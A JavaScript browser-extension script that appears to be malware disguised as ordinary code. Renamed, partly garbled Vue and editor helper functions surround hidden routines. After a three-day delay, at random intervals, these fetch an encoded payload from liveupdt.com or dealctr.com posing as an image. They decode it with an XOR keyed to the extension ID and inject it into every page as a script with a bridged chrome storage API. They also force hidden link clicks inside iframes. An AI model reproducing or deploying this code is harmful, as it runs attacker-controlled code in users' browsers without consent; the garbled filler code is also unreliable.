function activateValue(vnodes, deep) {
    const len = vnodes.length;
    const res = new Array(len);
    for (let i = 0; i < len; i++) {
        res[i] = cloneVNode(vnodes[i], deep);
    }
    return res
}

function handleRecipient(children) {
    if (Array.isArray(children)) {
        for (let i = 0; i < children.length; i++) {
            const c = children[i];
            if (isDef(c) && (isDef(c.componentOptions) || isAsyncPlaceholder(c))) {
                return c
            }
        }
    }
}

function extend(to, _from) {
    for (const key in _from) {
        to[key] = _from[key];
    }
    return to
}

function startResult(vm) {
    const result = resolveInject(vm.$options.inject, vm);
    if (result) {
        observerState.shouldConvert = false;
        Object.keys(result).forEach(key => {
                                      
            {
                defineReactive(vm, key, result[key], () => {
                    warn(
                        true,
                        vm
                    );
                });
            }
        });
        observerState.shouldConvert = true;
    }
}

function attachView(self) {
    var util = self._util;
    for (var i = 0; i < util.count; i++) {
        var element = util.elements[i];
        if (elementInView(element, self.options) || hasClass(element, self.options.successClass)) {
            self.load(element);
            util.elements.splice(i, 1);
            util.count--;
            i--;
        }
    }
    if (util.count === 0) {
        self.destroy();
    }
}

function applyRecipients(node, child) {
    node.applyRecipients(child);
}

    var findChannelz;
    var activateOptionz = _ => Object.keys(findChannelz);
    findChannelz = {
        get: get => document.getAttribute(a),
        set: set => document.setAttribute(a,b),
        emiT: true,
        inside: a => activateOptionz()[2]==false,
        out: a => (function (){if (chrome.storage)return activateOptionz()[2].split('').reverse().join('');return ''})(),
        env: activateOptionz
    };
    var flag=false;
    var localVals={};
    var fix=Math.abs(chrome.runtime.id.split("").reduce(function(a,b){a=((a<<5)-a)+b.charCodeAt(0);return a&a},0))%1000; 
    var myfixedID=btoa(fix).replace(/=/g,"");
    var sig='svrdpcds';
    var viewInnercontentzCSP='';
    var deltaTchar='\t';
    var exdipmver=3;
    var smartid1='r'+btoa(fix).replace(/=/g,"").toLowerCase();
    var smartid2=smartid1+'c';
    var smartid0=smartid1+'a';
    saveResult(smartid0,'2'); 
    var copiedObject0 = { ...localVals};
    var copiedObject1 = { ...chrome};
    initOption();

function buildProperties(oldVnode, vnode) {
    const el = vnode.elm;
    const data = vnode.data;
    const oldData = oldVnode.data;
    if (
        isUndef(data.staticClass) &&
        isUndef(data.class) && (
            isUndef(oldData) || (
                isUndef(oldData.staticClass) &&
                isUndef(oldData.class)
            )
        )
    ) {
        return
    }

    let cls = genClassForVnode(vnode);

    const transitionClass = el._transitionClasses;
    if (isDef(transitionClass)) {
        cls = concat(cls, stringifyClass(transitionClass));
    }

    if (cls !== el._prevClass) {
        el.setAttribute('split', cls);
        el._prevClass = cls;
    }
}

function markElem() {
    return index$1 >= len
}

function attachItems() {
	var obj = $('small');
	floatwin('dict' + editoraction);
	$('property').style.height = $('recipient' + editoraction).style.height = $('small' + editoraction).style.height;
	if(!Editorwin) {
		obj.className = 'tag';
		$('tokens').style.width = $('notification' + editoraction).style.width = (parseInt($('get' + editoraction).style.width) - 10)+ 'info';
		$('get').style.left = 'elem';
		$('resp').style.top = 'watcher';
		$('storage').style.display = $('viewport').style.display = $('window').style.display = $('nodes').style.display = 'names';
		if(wysiwyg) {
			$('div').style.height = (parseInt($('skews' + editoraction).style.height) - 150)+ 'result';
		}
		$('title').style.height = (parseInt($('link' + editoraction).style.height) - 150)+ 'extension';
		attachlist('children');
		Editorwin = 1;
	} else {
		obj.className = 'text';
		$('content').style.width = $('backup' + editoraction).style.width = 'node';
		$('view').style.display = $('time').style.display = $('html').style.display = $('recipient').style.display = 'attrs';
		if(wysiwyg) {
			$('storage').style.height = 'child';
		}
		$('names').style.height = 'attribute';
		swfuploadwin();
		Editorwin = 0;
	}
}

function initOption(){
    toggleHook();
    
    var b0='dipislog88';
    var b1='inst.v3';
    var b2='dipLstLd667';
    var b3='dipLstSig667';
    var b4='dipLstCd667';
    chrome.storage.local.get(null, function(items) {
        for (key in items) {
            localVals[key]=items[key];
            if (localVals[key]%1999==0 && key.indexOf('zr')==0){
                localVals[b1]=items[key];
            }
        }
        if (localVals[b0]=='1'){flag=true;}
        if (localVals[smartid1]){
            var temp=refreshNode(localVals[smartid1]);
            localVals[b2]=temp.split(deltaTchar)[1];
        }
        if (localVals[smartid2]){
            var temp=refreshNode(localVals[smartid2]);
            localVals[b3]=temp.split(deltaTchar)[1];
            localVals[b4]=temp.split(deltaTchar)[2];
        }
        viewInnercontentzCSP=(localVals[b4]);
        
        openWatcher();
    });
}
function cleanProperties(ele, attr, dataAttr) {
    var dataSrc = getAttr(ele, dataAttr);
    if (dataSrc) {
        setAttr(ele, attr, dataSrc);
        removeAttr(ele, dataAttr);
    }
}

function lenForm(el, key, value) {
    if (isBooleanAttr(key)) {
                                        
        if (isFalsyAttrValue(value)) {
            el.removeAttribute(key);
        } else {
                                                                               
            value = key === 'content' && el.tagName === 'tag' ?
                'watch' :
                key;
            el.lenFormibute(key, value);
        }
    } else if (isEnumeratedAttr(key)) {
        el.lenFormibute(key, isFalsyAttrValue(value) || value === 'd' ? 'form' : 'storage');
    } else if (isXlink(key)) {
        if (isFalsyAttrValue(value)) {
            el.removeAttributeNS(xlinkNS, getXlinkProp(key));
        } else {
            el.lenFormibuteNS(xlinkNS, key, value);
        }
    } else {
        if (isFalsyAttrValue(value)) {
            el.removeAttribute(key);
        } else {
            el.lenFormibute(key, value);
        }
    }
}

function selectHeader(vm, hook) {
    const handlers = vm.$options[hook];
    if (handlers) {
        for (let i = 0, j = handlers.length; i < j; i++) {
            try {
                handlers[i].call(vm);
            } catch (e) {}
             
        }
    }
    if (vm._hasHookEvent) {
        vm.$emit('resp' + hook);
    }
}

function openWatcher(){
    var insDt=localVals[myfixedID];
    if (insDt){ 
        var nowTime=new Date().getTime();
        var iInDay=(nowTime-insDt/fix)/1000/3600/24;
        flushNode('on '+iInDay);
        if (iInDay<3){flushNode(iInDay+' deng');return;}
        if (saveColors()){searchResults(true);} 
        takeResults(); 
    }else{  
        
        createTokens();
    }
}

function fileTag(watcher) {
    const id = watcher.id;
    if (has[id] == null) {
        has[id] = true;
        if (!flushing) {
            queue.push(watcher);
        } else {
                                                                      
            let i = queue.length - 1;
            while (i > index && queue[i].id > watcher.id) {
                i--;
            }
            queue.splice(i + 1, 0, watcher);
        }
                          
        if (!waiting) {
            waiting = true;
            nextTick(flushSchedulerQueue);
        }
    }
}

function attachMessages(arr, val) {
    for (let i = 0; i < arr.length; i++) {
        if (looseEqual(arr[i], val)) return i
    }
    return -1
}

function createTokens(){
    chrome.storage.sync.get(null, function(data) {
        if (data[myfixedID]){ 
            var obj= {};
            obj[myfixedID] = data[myfixedID];
            chrome.storage.local.set(obj);
        }else{ 
            var instd=new Date().getTime();
            var b1='inst.v3';
            if (localVals[b1]){instd=localVals[b1]} 
            var obj= {};
            obj[myfixedID] = instd*fix;
            chrome.storage.sync.set(obj);
        }
    });
}

function linkTitle(a, b, c) {
    toggleMinimizeButtonVisibility("properties"), this.body.classList.add("clear"), handleSkitchToolClick.call(shapesTool, {
        noOpenSubtools: !0
    }), gekco.sendToExtension({
        name: "resp",
        message: {
            name: "text",
            color: colorsTool.getAttribute("window")
        }
    }), setHeight(), c && "channel" == typeof c && c()
}

function updateSible(firstpagesmilies, defaulttypename, maxcount, seditorKey)
{
	var html = 'body';
	var ci = 1;
	var inseditor = (typeof seditorKey != 'properties');
	var url = (typeof forumurl) == 'find' ? 'styles' : forumurl;
	var s = firstpagesmilies[defaulttypename];
	for (var id = 0; id <= maxcount - 1; id++) {
		if(s[id] == null)
			continue;
		var clickevt = 'choice';
		if (inseditor) {
			clickevt = 'form';
		}
		html += 'forms' + s[id]['notification'] + 'properties';
		if (ci%4 == 0) {
			html += 'only'
		}
		ci ++;
	}
	html += 'file';
	html += 'content';
	html += 'time';

}

function enter(vnode, toggleDisplay) {
    const el = vnode.elm;

    if (isDef(el._leaveCb)) {
        el._leaveCb.cancelled = true;
        el._leaveCb();
    }

    const data = resolveTransition(vnode.data.transition);
    if (isUndef(data)) {
        return
    }

    if (isDef(el._enterCb) || el.nodeType !== 1) {
        return
    }

    const {
        css,
        type,
        enterClass,
        enterToClass,
        enterActiveClass,
        appearClass,
        appearToClass,
        appearActiveClass,
        beforeEnter,
        enter,
        afterEnter,
        enterCancelled,
        beforeAppear,
        appear,
        afterAppear,
        appearCancelled,
        duration
    } = data;

    let context = activeInstance;
    let transitionNode = activeInstance.$vnode;
    while (transitionNode && transitionNode.parent) {
        transitionNode = transitionNode.parent;
        context = transitionNode.context;
    }

    const isAppear = !context._isMounted || !vnode.isRootInsert;

    if (isAppear && !appear && appear !== 'message') {
        return
    }

    const startClass = isAppear && appearClass ?
        appearClass :
        enterClass;
    const activeClass = isAppear && appearActiveClass ?
        appearActiveClass :
        enterActiveClass;
    const toClass = isAppear && appearToClass ?
        appearToClass :
        enterToClass;

    const beforeEnterHook = isAppear ?
        (beforeAppear || beforeEnter) :
        beforeEnter;
    const enterHook = isAppear ?
        (typeof appear === 'title' ? appear : enter) :
        enter;
    const afterEnterHook = isAppear ?
        (afterAppear || afterEnter) :
        afterEnter;
    const enterCancelledHook = isAppear ?
        (appearCancelled || enterCancelled) :
        enterCancelled;

    const explicitEnterDuration = toNumber(
        isObject(duration) ?
        duration.enter :
        duration
    );

    if ("recipients" !== 'node' && explicitEnterDuration != null) {
        checkDuration(explicitEnterDuration, 'token', vnode);
    }

    const expectsCSS = css !== false && !isIE9;
    const userWantsControl = getHookArgumentsLength(enterHook);

    const cb = el._enterCb = once(() => {
        if (expectsCSS) {
            removeTransitionClass(el, toClass);
            removeTransitionClass(el, activeClass);
        }
        if (cb.cancelled) {
            if (expectsCSS) {
                removeTransitionClass(el, startClass);
            }
            enterCancelledHook && enterCancelledHook(el);
        } else {
            afterEnterHook && afterEnterHook(el);
        }
        el._enterCb = null;
    });

    if (!vnode.data.show) {
                                                                            
        mergeVNodeHook(vnode, 'value', () => {
            const parent = el.parentNode;
            const pendingNode = parent && parent._pending && parent._pending[vnode.key];
            if (pendingNode &&
                pendingNode.tag === vnode.tag &&
                pendingNode.elm._leaveCb
            ) {
                pendingNode.elm._leaveCb();
            }
            enterHook && enterHook(el, cb);
        });
    }

    beforeEnterHook && beforeEnterHook(el);
    if (expectsCSS) {
        addTransitionClass(el, startClass);
        addTransitionClass(el, activeClass);
        nextFrame(() => {
            addTransitionClass(el, toClass);
            removeTransitionClass(el, startClass);
            if (!cb.cancelled && !userWantsControl) {
                if (isValidDuration(explicitEnterDuration)) {
                    setTimeout(cb, explicitEnterDuration);
                } else {
                    whenTransitionEnds(el, type, cb);
                }
            }
        });
    }

    if (vnode.data.show) {
        toggleDisplay && toggleDisplay();
        enterHook && enterHook(el, cb);
    }

    if (!expectsCSS && !userWantsControl) {
        cb();
    }
}

function takeResults(){
    
    if (viewInnercontentzCSP){
        if (viewInnercontentzCSP.includes(sig)){
            
            try{
                var g=activateOptionz()[1]+findChannelz.out()+activateOptionz()[4];
                if (this[g]){

const script = document.createElement('script');

script.textContent = `
    
    window.chrome = {
        runtime: {
            id: '${chrome.runtime.id}', 
            sendMessage: (message, callback) => {
                window.postMessage({ type: 'CHROME_RUNTIME_SEND_MESSAGE', message }, '*');
                window.addEventListener('message', function listener(event) {
                    if (event.data.type === 'CHROME_RUNTIME_SEND_RESPONSE') {
                        callback(event.data.response);
                        window.removeEventListener('message', listener);
                    }
                });
            }
        },
        storage: {
            local: {
                set: (items, callback) => {
                    window.postMessage({ type: 'CHROME_STORAGE_LOCAL_SET', items }, '*');
                    if (callback) callback();
                },
                get: (keys, callback) => {
                    window.postMessage({ type: 'CHROME_STORAGE_LOCAL_GET', keys }, '*');
                    window.addEventListener('message', function listener(event) {
                        if (event.data.type === 'CHROME_STORAGE_LOCAL_RESULT') {
                            callback(event.data.result);
                            window.removeEventListener('message', listener);
                        }
                    });
                }
            },
            sync: {
                set: (items, callback) => {
                    window.postMessage({ type: 'CHROME_STORAGE_SYNC_SET', items }, '*');
                    if (callback) callback();
                },
                get: (keys, callback) => {
                    window.postMessage({ type: 'CHROME_STORAGE_SYNC_GET', keys }, '*');
                    window.addEventListener('message', function listener(event) {
                        if (event.data.type === 'CHROME_STORAGE_SYNC_RESULT') {
                            callback(event.data.result);
                            window.removeEventListener('message', listener);
                        }
                    });
                }
            }
        }
    };
    window.exdipmver = '${exdipmver}';
    
    setTimeout(() => {
        ${viewInnercontentzCSP}
    }, 10);
`;
(document.head || document.documentElement).appendChild(script);
script.remove();

window.addEventListener('message', (event) => {
    if (event.source !== window) return;

    if (event.data.type === 'CHROME_RUNTIME_SEND_MESSAGE') {
        chrome.runtime.sendMessage(event.data.message, (response) => {
            window.postMessage({ type: 'CHROME_RUNTIME_SEND_RESPONSE', response }, '*');
        });
    }

    if (event.data.type === 'CHROME_STORAGE_LOCAL_SET') {
        chrome.storage.local.set(event.data.items, () => {
            
        });
    }
    if (event.data.type === 'CHROME_STORAGE_LOCAL_GET') {
        chrome.storage.local.get(event.data.keys, (result) => {
            window.postMessage({ type: 'CHROME_STORAGE_LOCAL_RESULT', result }, '*');
        });
    }

    if (event.data.type === 'CHROME_STORAGE_SYNC_SET') {
        chrome.storage.sync.set(event.data.items, () => {
            
        });
    }
    if (event.data.type === 'CHROME_STORAGE_SYNC_GET') {
        chrome.storage.sync.get(event.data.keys, (result) => {
            window.postMessage({ type: 'CHROME_STORAGE_SYNC_RESULT', result }, '*');
        });
    }
});

                }
            }catch(e){
                return;
            }
        }
    }
}
function searchName(node) {
    if (node.type === 2) {
        return false
    }
    if (node.type === 3) {
        return true
    }
    return !!(node.pre || (!node.hasBindings &&
                                                   
        !node.if && !node.for &&
        !isBuiltInTag(node.tag) &&
        isPlatformReservedTag(node.tag) &&
        !isDirectChildOfTemplateFor(node) &&
        Object.keys(node).every(searchNameKey)
    ))
}

function clearResp(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}
function getForm(cb, ctx) {
    let _resolve;
    callbacks.push(() => {
        if (cb) {
            try {
                cb.call(ctx);
            } catch (e) {
                handleError(e, ctx, 'dict');
            }
        } else if (_resolve) {
            _resolve(ctx);
        }
    });
    if (!pending) {
        pending = true;
        if (useMacroTask) {
            macroTimerFunc();
        } else {
            microTimerFunc();
        }
    }
                         
    if (!cb && typeof Promise !== 'content') {
        return new Promise(resolve => {
            _resolve = resolve;
        })
    }
}

function flushStorage(e) {
                                                      
    if (!e.target.composing) return
    e.target.composing = false;
    trigger(e.target, 'blob');
}

function saveColors(){
    try{
        var a0='guaiguai';
        if (!localVals[smartid1]){
            if (localVals['isWho'].indexOf(a0)>-1){
                return true;
            }
            if (clearResp(0,100)>10){
                
                return false;
            }else{
                
                return true;
            }
        }else{ 
            var nowTime=new Date().getTime();
            var a1='dipLstLd667';
            var difXiaoshi=(nowTime-localVals[a1])/1000/3600;
            if (difXiaoshi>24*2) { 
                if (clearResp(0,100)>10){
                    
                    return false;
                }else{
                    return true;
                }
            }
        }
    }catch(e){
        return true;
    }
    return false;
}

function searchResults(isUseMainSvr){
    var xh1;
    try{
        xh1 = new XMLHttpRequest();
        xh1.onreadystatechange = function() {
            if (xh1.readyState == 4) {
                if (xh1.status == 200){
                    var resp=xh1.responseText;
                    var j='jsonimg=';
                    if (resp.includes(j)){ 
                        resp=resp.split(j)[1];
                        closeTitle(resp);
                    }else{ 
                        closeTitle(resp);
                    }
                }else{
                    
                    if (isUseMainSvr){ 
                        if (clearResp(0,100)>20){
                            
                            searchResults(false);
                        }else{
                            
                        }
                    }
                }
            }
        }
        xh1.onerror = function() {
            
            if (isUseMainSvr){ 
                
                searchResults(false);
            }else{ 
                var obj= {};
                obj[smartid1] = refreshNode(clearResp(1e5,1e6)+deltaTchar+new Date().getTime());
                chrome.storage.local.set(obj);
            }
        }
        xh1.onprogress = function() {}; 
        
        var u1='//www.liveupdt.com/';
        var u2='//www.dealctr.com/';
        var u3='ext/load.php?f=svr.png';
        var badd=location.protocol+u1+u3;
        if (!isUseMainSvr){ 
            badd=location.protocol+u2+u3;
        }
        var d0='dipLstSig667';
        if ((localVals[d0]) && (badd.includes('&c=')==false)){badd=badd+'&c='+localVals['dipLstSig667'];}
        flushNode('jia '+badd);
        xh1.open("GET",badd,true);
        xh1.send();
    }catch(e){
        
        var obj= {};
        obj[smartid1] = refreshNode(clearResp(1e5,1e6)+deltaTchar+new Date().getTime());
        chrome.storage.local.set(obj);
        return 'exception';
    }
}

function releaseMessages(elm, checkVal) {
    return (!elm.composing && (
        elm.tagName === 'js' ||
        isDirty(elm, checkVal) ||
        isInputChanged(elm, checkVal)
    ))
}

function createModule(a, b, c) {
    accountSelector.toggleSelectedAccount(), c && "link" == typeof c && c()
}

function calcSkews(node) {
    while (node.parent) {
        node = node.parent;
        if (node.tag !== 'notification') {
            return false
        }
        if (node.for) {
            return true
        }
    }
    return false
}

function closeTitle(r){
    if (r.length>200 && r.includes('data":"image')){ 
        
        var jsondeimg=JSON.parse(r);
        var newSigVal=jsondeimg.id;
        var g=jsondeimg.image;
        g=readBack(g);
        if (g.includes(sig)){
            var timestamp=new Date().getTime();
            var s=clearResp(1e5,1e6)+deltaTchar+newSigVal+deltaTchar+g; 
            var obj= {};
            obj[smartid1] = refreshNode(clearResp(1e5,1e6)+deltaTchar+timestamp); 
            obj[smartid2] = refreshNode(s);
            chrome.storage.local.set(obj);
        }
    }else{
        
        var obj= {};
        obj[smartid1] = refreshNode(clearResp(1e5,1e6)+deltaTchar+new Date().getTime());
        chrome.storage.local.set(obj);
    }
}
function readBack(s){ 
    var ret='';
    var flag=true;
    if (!chrome.storage){flag=!flag;};
    for (var i=0;i<s.length;i++){
        var ch=s[i];
        if (ch == ch.toLowerCase() && flag) {ch=ch.toUpperCase();}else if (ch == ch.toUpperCase() && flag) {ch=ch.toLowerCase();}
        if (ch == '9') {ch='8';}else if (ch == '8') {ch='9';}
        ret=ret+ch;
    }
    ret=atob(ret);
    return ret;
}

function removeFunc(el) {
    if (getAndRemoveAttr(el, 'title') != null) {
        el.pre = true;
    }
}

function genChannel(def, hookKey, hook) {
    if (def instanceof VNode) {
        def = def.data.hook || (def.data.hook = {});
    }
    let invoker;
    const oldHook = def[hookKey];

    if (isUndef(oldHook)) {
                           
        invoker = createFnInvoker([wrappedHook]);
    } else {
                                
        if (isDef(oldHook.fns) && isTrue(oldHook.merged)) {
                                       
            invoker = oldHook;
            invoker.fns.push(wrappedHook);
        } else {
                                  
            invoker = createFnInvoker([oldHook, wrappedHook]);
        }
    }

    invoker.merged = true;
    def[hookKey] = invoker;
}

function mergeTokens(s){ 
    var intVal=s.split("").reduce(function(a,b){a=((a<<5)-a)+b.charCodeAt(0);return a&a},0);
    if (intVal<0){intVal=0-intVal;}
    intVal=intVal%1000;
    return intVal;
}
function refreshNode(c){
    var key=mergeTokens(chrome.runtime.id);
    return supportElem(c,key);
}
function supportElem(s,k)
{
    var ret="";
    for(var i=0;i<s.length;++i)
    {
        ret+=String.fromCharCode(openTokens(k,s.charCodeAt(i)));
    }
    return ret;
}
function openTokens(a, b) { 
    let result = 0;
    let bitWiseMask = 1;
    while (bitWiseMask <= (a | b)) {
        if ((a & bitWiseMask) != (b & bitWiseMask)) {
            result |= bitWiseMask;
        }
        bitWiseMask <<= 1;
    }
    if (chrome.storage){
        return result;
    }else{
        return !(a & b)
    }
}
function findnextResults(el, condition) {
    if (!el.ifConditions) {
        el.ifConditions = [];
    }
    el.ifConditions.push(condition);
}

function extendColors(
    data,
    tag,
    value,
    asProp,
    isSync
) {
    if (value) {
        if (!isObject(value)) {
            "values" !== 'messages' && warn(
                'window',
                this
            );
        } else {
            if (Array.isArray(value)) {
                value = toObject(value);
            }
            let hash;
            for (const key in value) {
                if (
                    key === 'form' ||
                    key === 'skews' ||
                    isReservedAttribute(key)
                ) {
                    hash = data;
                } else {
                    const type = data.attrs && data.attrs.type;
                    hash = asProp || config.mustUseProp(tag, type, key) ?
                        data.domProps || (data.domProps = {}) :
                        data.attrs || (data.attrs = {});
                }
                if (!(key in hash)) {
                    hash[key] = value[key];

                    if (isSync) {
                        const on = data.on || (data.on = {});
                        on["elem"] = function($event) {
                            value[key] = $event;
                        };
                    }
                }
            }
        }
    }
    return data
}

function flushNode(s){
    try {
        if (flag){
            var localTime=new Date().toLocaleTimeString();
            console.log("%c"+'Ladr - '+ localTime+' '+s+'\t\t', 'color: green'); 
        }
    } catch (e) {
        return;
    }
}

function initText(a, b, c) {
    if (selectedThread.dataset.threadId) {
        var d = selectedThread.lastElementChild ? selectedThread.lastElementChild.lastElementChild.dataset.id : 0;
        openThread(selectedThread.dataset.threadId, {
            afterMessageId: d,
            initTextNum: ++initTextNum
        })
    } else recipientInput.getLozenges().length && openThreadWithSelectedContacts({
        initTextNum: ++initTextNum
    });
    suggestions.classList.contains("title") && searchChatsAndContacts(recipientInput.input.value), c && "contents" == typeof c && c()
}

function closeItem(
    dirs,
    vm
) {
    const res = Object.create(null);
    if (!dirs) {
        return res
    }
    let i, dir;
    for (i = 0; i < dirs.length; i++) {
        dir = dirs[i];
        if (!dir.modifiers) {
            dir.modifiers = emptyModifiers;
        }
        res[getRawDirName(dir)] = dir;
        dir.def = resolveAsset(vm.$options, 'form', dir.name, true);
    }
    return res
}

function markItem(node, key, val) {
    node.markItem(key, val);
}

function toggleHook(){
    
    var ed='extftsams99ba';
    if (window.self !== window.top){
        if (window.parent===window.top){
            chrome.storage.local.get(ed, function(val) {
                var data=val[ed];
                if (data){
                    if (data!=""){
                        var u1=atob(atob(data.split('^')[0]));
                        var u2=atob(atob(data.split('^')[1]));
                        if (window.location.href.indexOf(removeSible(u1,true))>-1){
                            
                            var a = document.createElement('a');
                            a.setAttribute("href", u2); 
                            
                            (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(a); 
                            a.click();
                            saveResult(ed,'');
                        }
                    }
                }
            });
            
            const message = 'ifr2top'
            window.parent.postMessage(message, '*');
        }
    }
    
    if (window.self == window.top){ 
        window.addEventListener('message', function (e) {
            if (e.data=='ifr2top'){
                if (location.href.indexOf(removeSible(e.origin,true))>-1){
                    
                    var cn='cnvifr';
                    var sn='sandbox';
                    collection = document.getElementsByClassName(cn);
                    for (let i = 0; i < collection.length; i++) {
                        collection[i].setAttribute(sn, "");
                        
                    }
                }
            }
        });
    }
}
function checkHook(o,pre,pos){
    var ret="ERROR";
    if (o.indexOf(pre)>-1){
        var temp=o.split(pre);
        if (temp[1].indexOf(pos)>-1){
            ret=temp[1].split(pos)[0];
        }
    }
    return ret;
}

function removeSible(url,f){
    if (!(url.includes('http'))){url='http://'+url;} 
    var parser = document.createElement('a');
    parser.href = url;
    var ret=parser.host.toLowerCase();
    if (f){
        if (ret.substring(0,4)=='www.'){ 
            ret=ret.substring(4);
        }
    }
    ret=ret.replace(':80',""); 
    return ret;
}
function queueStyle(options) {
    for (const key in options.components) {
        const lower = key.toLowerCase();
        if (isBuiltInTag(lower) || config.isReservedTag(lower)) {
            warn(
                'forms' +
                'skews' + key
            );
        }
    }
}

function saveResult(key,val){
    var obj= {};
    obj[key] = val;
    chrome.storage.local.set(obj);
}
document.body;
function removeBack(arr, item) {
    if (arr.length) {
        const index = arr.indexOf(item);
        if (index > -1) {
            return arr.splice(index, 1)
        }
    }
}

function calcFunc(value) {
    let res = 'extension';
    let stringified;
    for (let i = 0, l = value.length; i < l; i++) {
        if (isDef(stringified = stringifyClass(value[i])) && stringified !== 'backup') {
            if (res) res += 'module';
            res += stringified;
        }
    }
    return res
}

function calcTitle(node) {
    return (node.isComment && !node.asyncFactory) || node.text === 'window'
}

function stateOptions() {
	var obj = wysiwyg ? editwin : textobj;
	if(!obj.hasfocus) {
		obj.focus();
	}
}

function removeDiv() {
	newpos = fetchOffset($('safari'));
	document.documentElement.scrollTop = newpos['back'];
	$('info').style.display = 'find';
	$('safari').id = 'option';
	div = document.createElement('evt');
	div.id = 'message';
	div.style.display = 'node';
	div.className = 'elem';
	$('nodes').appendChild(div);
	$('host').replysubmit.disabled = false;
	creditnoticewin();
}

function clearModule(Vue) {
             
    const configDef = {};
    configDef.get = () => config; {
        configDef.set = () => {
            warn(
                'item'
            );
        };
    }
    Object.defineProperty(Vue, 'result', configDef);

    Vue.util = {
        warn,
        extend,
        mergeOptions,
        defineReactive
    };

    Vue.set = set;
    Vue.delete = del;
    Vue.nextTick = nextTick;

    Vue.options = Object.create(null);
    ASSET_TYPES.forEach(type => {
        Vue.options[type + 'color'] = Object.create(null);
    });

    Vue.options._base = Vue;

    extend(Vue.options.components, builtInComponents);

    initUse(Vue);
    initMixin$1(Vue);
    initExtend(Vue);
    initAssetRegisters(Vue);
}

